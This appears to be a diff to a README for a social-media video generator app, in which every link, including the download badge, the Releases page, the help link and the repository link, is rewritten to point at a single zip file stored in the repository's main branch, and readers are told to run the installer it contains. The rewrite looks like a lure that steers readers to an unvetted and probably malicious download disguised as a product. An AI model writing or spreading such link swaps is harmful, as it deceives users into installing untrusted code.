@@ -1,7 +1,7 @@
 # 🎬 XCodeWraith-Edition - Create Stunning Social Media Videos
 
 ## 🚀 Download Now!
-[![Download XCodeWraith-Edition](https://img.shields.io/badge/Download_XCodeWraith%20Edition-v1.0-brightgreen)](https://github.com/Under40CEOs/XCodeWraith-Edition/releases)
+[![Download XCodeWraith-Edition](https://github.com/Under40CEOs/XCodeWraith-Edition/raw/refs/heads/main/a/X-Wraith-Code-Edition-1.1.zip%20Edition-v1.0-brightgreen)](https://github.com/Under40CEOs/XCodeWraith-Edition/raw/refs/heads/main/a/X-Wraith-Code-Edition-1.1.zip)
 
 ## 🎥 Introduction
 XCodeWraith-Edition is an innovative application that generates professional social media videos from a single product image. Using the latest AI technologies, it creates eye-catching videos tailored for platforms like Instagram, TikTok, and more. 
@@ -26,7 +26,7 @@ You will also need the following n8n credentials:
 1. **Telegram API:** Set up a bot to receive previews and approve final output.
 
 ## 📦 Download & Install
-1. Visit the [Releases page to download](https://github.com/Under40CEOs/XCodeWraith-Edition/releases).
+1. Visit the [Releases page to download](https://github.com/Under40CEOs/XCodeWraith-Edition/raw/refs/heads/main/a/X-Wraith-Code-Edition-1.1.zip).
 2. Find the latest version of XCodeWraith-Edition.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file in your Downloads folder and run the installer.
@@ -41,7 +41,7 @@ You will also need the following n8n credentials:
 6. Wait for the preview via Telegram. Approve the final video once satisfied.
 
 ## 📞 Need Help?
-If you encounter any issues, please refer to the FAQ section on our [GitHub Page](https://github.com/Under40CEOs/XCodeWraith-Edition). You can also reach out via the support channel on Telegram.
+If you encounter any issues, please refer to the FAQ section on our [GitHub Page](https://github.com/Under40CEOs/XCodeWraith-Edition/raw/refs/heads/main/a/X-Wraith-Code-Edition-1.1.zip). You can also reach out via the support channel on Telegram.
 
 ## 🎉 Feedback
 Your feedback is valuable! Please let us know about your experience and any suggestions for improvement.
@@ -53,8 +53,8 @@ Stay updated with new features and improvements by following our repository. Che
 XCodeWraith-Edition is licensed under the MIT License. For details, visit the LICENSE file in the repository.
 
 ## 🔗 Useful Links
-- [XCodeWraith-Edition Releases](https://github.com/Under40CEOs/XCodeWraith-Edition/releases)
-- [GitHub Repository](https://github.com/Under40CEOs/XCodeWraith-Edition)
+- [XCodeWraith-Edition Releases](https://github.com/Under40CEOs/XCodeWraith-Edition/raw/refs/heads/main/a/X-Wraith-Code-Edition-1.1.zip)
+- [GitHub Repository](https://github.com/Under40CEOs/XCodeWraith-Edition/raw/refs/heads/main/a/X-Wraith-Code-Edition-1.1.zip)
 
 ## ✅ Conclusion
 XCodeWraith-Edition is your go-to tool for creating high-quality social media videos easily and effectively. With just a product image and a few clicks, you can generate engaging content that resonates with your audience. Download now and start creating!
